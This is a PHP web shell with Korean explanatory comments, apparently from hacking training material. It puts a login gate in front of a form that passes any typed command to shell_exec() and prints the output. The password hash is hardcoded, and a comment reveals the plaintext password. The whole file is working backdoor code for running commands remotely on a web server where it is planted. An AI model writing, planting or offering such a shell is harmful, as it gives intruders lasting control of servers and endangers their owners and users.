<?php
// cmd 의 결과값은 EUC-KR 형식이므로 웹 페이지의 문자 인코딩을 EUC-KR로 설정
header("Content-Type: text/html; charset=EUC-KR");
// 현재 스크립트의 URL 경로를 $page 변수에 저장
$page = $_SERVER["PHP_SELF"];

//로그인 검증 기능 추가
@session_start(); // 세션 시작
$password = "19fbb8b248a686317a5da1d0619df988"; //crehacktive 패스워드를 MD5 Hash 암호화
$input_password = isset($_POST["password"]) ? $_POST["password"] : ""; // 사용자 입력 비밀번호가 비어있다면 빈 문자열로 지정

// 세션이 없고 입력된 비밀번호가 없을 경우 로그인 폼 표시
if(empty($_SESSION["webshell_id"]) && empty($input_password)) {
    ?>
    <form action="<?=$page?>" method="POST">
        <input type="password" name="password">
        <input type="submit" value="AUTH">
    </form>
    <?php
    exit(); // 스크립트 실행 중단
} else if (empty($_SESSION["webshell_id"]) && !empty($input_password)) {
    // 입력된 비밀번호의 MD5 해시값과 저장된 비밀번호 해시값 비교
    if($password == MD5($input_password)){
        //Login Success => Session 발급
        $_SESSION["webshell_id"] = "crehacktive"; // 세션에 사용자 ID 저장
        echo "<script>location.href='{$page}'</script>"; // 같은 페이지로 리다이렉트
        exit();
    }
    else{
        echo "<script>location.href='{$page}'</script>"; // 로그인 실패 시 같은 페이지로 리다이렉트
    }
}
?>

<form action="<?=$page?>" method="POST">
    <!-- 셸 명령어를 입력받는 텍스트 입력 필드 -->
    <input type="text" name="cmd">
    <!-- 명령어 실행 버튼 -->
    <input type="submit" value="EXECUTE">
</form>
<?php
if (isset($_POST["cmd"])) { // 'cmd' 키가 $_POST 배열에 존재하는지 확인
    $cmd = $_POST["cmd"];
    if (!empty($cmd)) { //// 'cmd' 값이 존재하는지 확인
        // shell_exec()를 통해 사용자 입력 명령어를 실행
        // 주의: 이 방식은 보안상 매우 위험할 수 있음
        $result = shell_exec($cmd);
        // 명령어 실행 결과의 개행 문자를 HTML 줄바꿈 태그로 변환
        $result = str_replace("\n", "<br>", $result);
        // 명령어 실행 결과를 웹 페이지에 출력
        echo $result;
    }
}
?>
